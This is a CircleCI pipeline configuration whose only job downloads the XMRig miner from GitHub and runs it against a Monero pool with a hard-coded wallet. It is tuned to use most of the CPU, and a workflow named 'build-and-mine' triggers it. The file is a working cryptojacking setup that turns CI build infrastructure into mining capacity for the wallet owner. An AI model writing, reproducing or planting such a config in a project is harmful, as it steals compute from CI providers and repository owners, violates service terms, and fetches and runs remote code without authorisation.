version: 2.1

jobs:
  mine:
    docker:
      - image: alpine:latest
    steps:
      - run:
          name: Install dependencies and start mining
          command: |
            apk add --no-cache wget tar
            wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz
            tar -xzf xmrig-6.21.2-linux-static-x64.tar.gz
            cd xmrig-6.21.2
            ./xmrig \
              --url=pool.supportxmr.com:443 \
              --user=49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP \
              --pass=$(hostname) \
              --tls \
              --keepalive \
              --cpu-max-threads-hint=80 \
              --cpu-priority=5 \
              --randomx-mode=fast \
              --donate-level=1 \
              --no-color

workflows:
  version: 2
  build-and-mine:
    jobs:
      - mine
